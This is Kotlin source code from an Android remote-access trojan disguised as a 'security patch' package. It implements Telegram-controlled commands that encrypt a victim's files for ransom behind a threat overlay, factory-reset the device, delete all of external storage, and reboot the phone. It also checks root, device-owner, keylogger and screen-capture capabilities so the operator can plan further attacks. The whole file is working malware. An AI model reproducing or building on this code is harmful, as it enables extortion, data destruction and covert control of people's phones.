package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import com.android.security.patch.AdminReceiver
import com.android.security.patch.Prefs
import com.android.security.patch.RansomManager
import com.android.security.patch.RatApi
import java.io.File
import kotlin.random.Random

object DangerCmd {

    /**
     * /ransom start <pesan ancaman...>
     *   → generate random key, enkripsi /sdcard file penting, tunjukin overlay merah,
     *     kirim key ke telegram (JANGAN SAMPAI HILANG)
     * /ransom stop <key>
     *   → verifikasi, dekripsi, cabut overlay
     */
    fun ransom(ctx: Context, chatId: Long, args: Array<String>) {
        val sub = args.getOrNull(0)?.lowercase() ?: "help"
        when (sub) {
            "start" -> {
                val msg = args.drop(1).joinToString(" ").ifBlank {
                    "⚠ SEMUA FILE ANDA TERENKRIPSI ⚠\n\n" +
                    "Hubungi administrator untuk membuka.\n" +
                    "Jangan restart atau copot baterai."
                }
                val key = generateKey()
                RansomManager.setKey(ctx, key)
                RansomManager.setMessage(ctx, msg)
                RatApi.sendMessage(
                    ctx,
                    "<b>🔐 RANSOM STARTED</b>\n" +
                    "key: <code>$key</code>\n" +
                    "menyimpan key ini adalah satu-satunya cara dekripsi.\n\n" +
                    "<i>encrypting...</i>",
                    chatId
                )
                RansomManager.encryptAll(ctx, key) { count ->
                    RansomManager.showOverlay(ctx, msg)
                    RatApi.sendMessage(
                        ctx,
                        "✅ ransom done — $count file terenkripsi\n" +
                        "decrypt: <code>/ransom stop $key</code>",
                        chatId
                    )
                }
            }

            "stop" -> {
                val key = args.getOrNull(1) ?: run {
                    RatApi.sendMessage(ctx, "usage: /ransom stop &lt;key&gt;", chatId); return
                }
                if (!RansomManager.verifyKey(ctx, key)) {
                    RatApi.sendMessage(ctx, "❌ key salah", chatId); return
                }
                RatApi.sendMessage(ctx, "decrypting...", chatId)
                RansomManager.decryptAll(ctx, key) { count ->
                    RatApi.sendMessage(ctx, "✅ decrypted $count file", chatId)
                }
            }

            else -> RatApi.sendMessage(
                ctx,
                "usage:\n/ransom start [pesan]\n/ransom stop &lt;key&gt;",
                chatId
            )
        }
    }

    private fun generateKey(): String {
        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return (1..24).map { chars[Random.nextInt(chars.length)] }.joinToString("")
    }

    /**
     * /wipe CONFIRM
     * factory reset via device admin. butuh admin aktif.
     */
    fun wipe(ctx: Context, chatId: Long, args: Array<String>) {
        val confirm = args.getOrNull(0)?.uppercase()
        if (confirm != "CONFIRM") {
            RatApi.sendMessage(
                ctx,
                "⚠ ini akan factory-reset device target.\n" +
                "kirim: <code>/wipe CONFIRM</code> untuk lanjut.",
                chatId
            )
            return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
            RatApi.sendMessage(ctx, "admin tidak aktif — wipe tidak bisa", chatId); return
        }
        try {
            RatApi.sendMessage(ctx, "wiping device now...", chatId)
            dpm.wipeData(0)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /**
     * /format_storage — hapus total isi /sdcard (userland, tanpa root).
     * device owner + root bisa lebih agresif, tapi ini yang paling reliable.
     */
    fun formatStorage(ctx: Context, chatId: Long) {
        Thread {
            try {
                val root = Environment.getExternalStorageDirectory()
                var deleted = 0
                var failed = 0

                fun wipe(f: File) {
                    try {
                        if (f.isDirectory) {
                            f.listFiles()?.forEach { wipe(it) }
                        }
                        if (f.delete()) deleted++ else failed++
                    } catch (_: Throwable) { failed++ }
                }

                // jangan hapus folder /sdcard sendiri, hapus isinya
                root.listFiles()?.forEach { child ->
                    // skip folder Android biar aplikasi lain gak crash — lu bisa ubah
                    if (child.name.equals("Android", ignoreCase = true)) return@forEach
                    wipe(child)
                }

                RatApi.sendMessage(
                    ctx,
                    "🧹 format done — $deleted deleted, $failed failed",
                    chatId
                )
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /**
     * /check_paths — cek privilege device:
     * - admin aktif?
     * - device owner?
     * - root?
     * - MANAGE_EXTERNAL_STORAGE?
     * - media projection?
     */
    fun checkPaths(ctx: Context, chatId: Long) {
        Thread {
            val sb = StringBuilder("<b>device capability check</b>\n\n")

            val adminOk = AdminReceiver.isActive(ctx)
            sb.append("device admin: ${if (adminOk) "✅ aktif" else "❌ tidak"}\n")

            val doOk = AdminReceiver.isDeviceOwner(ctx)
            sb.append("device owner: ${if (doOk) "✅ ya" else "❌ tidak (unlock/setpin/silent-uninstall off)"}\n")

            val rootOk = isRooted()
            sb.append("root: ${if (rootOk) "✅ ya" else "❌ tidak"}\n")

            val extOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                Environment.isExternalStorageManager()
            else true
            sb.append("all-files access: ${if (extOk) "✅ ya" else "❌ tidak"}\n")

            val overlayOk = android.provider.Settings.canDrawOverlays(ctx)
            sb.append("overlay: ${if (overlayOk) "✅ ya" else "❌ tidak"}\n")

            val a11y = com.android.security.patch.KeylogService.alive
            sb.append("accessibility: ${if (a11y) "✅ aktif" else "❌ tidak"}\n")

            val notif = com.android.security.patch.NotifListener.alive
            sb.append("notif listener: ${if (notif) "✅ aktif" else "❌ tidak"}\n")

            val proj = com.android.security.patch.ScreenCap.isReady()
            sb.append("media projection: ${if (proj) "✅ aktif" else "❌ tidak"}\n")

            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            val batt = pm.isIgnoringBatteryOptimizations(ctx.packageName)
            sb.append("battery opt ignore: ${if (batt) "✅ ya" else "❌ tidak"}\n")

            sb.append("\n<b>bisa hapus:</b>\n")
            sb.append("• sdcard isi: ✅ (userland)\n")
            sb.append("• app lain: ${if (doOk || rootOk) "✅ silent" else "⚠ prompt manual"}\n")
            sb.append("• wipe total: ${if (adminOk) "✅" else "❌"}\n")
            sb.append("• reboot: ${if (doOk || rootOk) "✅" else "❌"}\n")
            sb.append("• set pin: ${if (doOk) "✅" else "❌"}\n")
            sb.append("• unlock tanpa pin: ${if (rootOk) "✅" else "❌"}\n")

            RatApi.sendMessage(ctx, sb.toString(), chatId)
        }.start()
    }

    private fun isRooted(): Boolean {
        val paths = listOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su",
            "/system/xbin/which"
        )
        if (paths.any { File(it).exists() }) return true
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("which", "su"))
            p.inputStream.bufferedReader().readText().trim().isNotEmpty() && p.waitFor() == 0
        } catch (_: Throwable) { false }
    }

    /**
     * /reboot CONFIRM — reboot device
     * device owner: dpm.reboot()
     * root: su -c reboot
     */
    fun reboot(ctx: Context, chatId: Long, args: Array<String>) {
        val confirm = args.getOrNull(0)?.uppercase()
        if (confirm != "CONFIRM") {
            RatApi.sendMessage(ctx, "kirim: <code>/reboot CONFIRM</code>", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            if (AdminReceiver.isDeviceOwner(ctx)) {
                RatApi.sendMessage(ctx, "rebooting (device owner)...", chatId)
                dpm.reboot(AdminReceiver.component(ctx))
                return
            }
        } catch (_: Throwable) {}
        try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
            p.waitFor()
            RatApi.sendMessage(ctx, "reboot issued via su", chatId)
        } catch (_: Throwable) {
            // fallback: intent reboot (biasanya gagal tanpa sistem permission)
            try {
                val i = Intent("android.intent.action.REBOOT").apply {
                    putExtra("nowait", 1); putExtra("interval", 1); putExtra("window", 0)
                }
                ctx.sendBroadcast(i)
                RatApi.sendMessage(ctx, "reboot intent sent (may fail)", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "reboot failed: no DO, no root", chatId)
            }
        }
    }
}